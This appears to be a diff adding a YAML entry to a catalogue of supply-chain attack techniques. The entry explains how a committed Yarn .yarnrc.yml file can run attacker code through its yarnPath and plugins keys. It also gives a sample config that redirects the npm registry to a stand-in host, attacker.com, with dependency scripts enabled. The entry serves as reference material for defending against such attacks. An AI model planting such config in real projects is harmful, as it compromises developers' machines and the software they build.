@@ -1,0 +1,68 @@
+name: .yarnrc.yml yarnPath & Plugins
+id: yarnrc
+description: >
+  Modern Yarn (Berry) reads .yarnrc.yml from the project. Keys like yarnPath,
+  plugins, and the script-execution settings let a committed config point Yarn at
+  an attacker-controlled release binary or load arbitrary plugin code, so running
+  any yarn command in the repo executes that code.
+author: LOC Team
+tags:
+  - yarn
+  - npm
+  - code-execution
+  - supply-chain
+
+exploitation: |
+  Yarn 2+ (Berry) is configured through a project-level `.yarnrc.yml`, committed
+  alongside the code. Because the repository normally ships its own pinned Yarn
+  release and plugins, several keys point at executable code that Yarn loads and
+  runs on essentially any invocation. The classic "Zero-Installs" workflow makes
+  this worse: the Yarn binary and plugins are committed under `.yarn/`, so they
+  run straight from the repo with no fetch step.
+
+  ### yarnPath — hijack the Yarn binary itself
+
+  `yarnPath` tells the globally installed Yarn shim to defer to a specific
+  release script in the repo. Point it at an attacker-supplied file and *every*
+  `yarn` command in that project executes that script first.
+
+  ```yaml
+  yarnPath: ./.yarn/releases/yarn-pwn.cjs
+  ```
+
+  The referenced `.cjs` is plain Node and runs with the developer's privileges
+  the moment they type `yarn`, `yarn install`, or even `yarn --version`.
+
+  ### plugins — load arbitrary plugin code
+
+  Plugins are JS modules loaded into the Yarn process. A committed plugin path is
+  imported and executed on startup.
+
+  ```yaml
+  plugins:
+    - path: .yarn/plugins/pwn.cjs
+      spec: "pwn"
+  ```
+
+  ### Registry redirection and lifecycle scripts
+
+  `.yarnrc.yml` can also redirect package resolution and control whether
+  dependency lifecycle scripts run:
+
+  ```yaml
+  npmRegistryServer: "https://attacker.com/npm/"
+  npmScopes:
+    mycompany:
+      npmRegistryServer: "https://attacker.com/npm/"
+  enableScripts: true
+  ```
+
+  Redirecting the registry enables serving backdoored dependencies (including the
+  scoped variant for dependency confusion), while `enableScripts` ensures
+  `postinstall`-style hooks in those dependencies actually execute.
+
+references:
+  - url: https://yarnpkg.com/configuration/yarnrc
+    description: Official .yarnrc.yml configuration reference (yarnPath, plugins, scripts)
+  - url: https://yarnpkg.com/features/zero-installs
+    description: Yarn Zero-Installs - committing the binary and dependencies
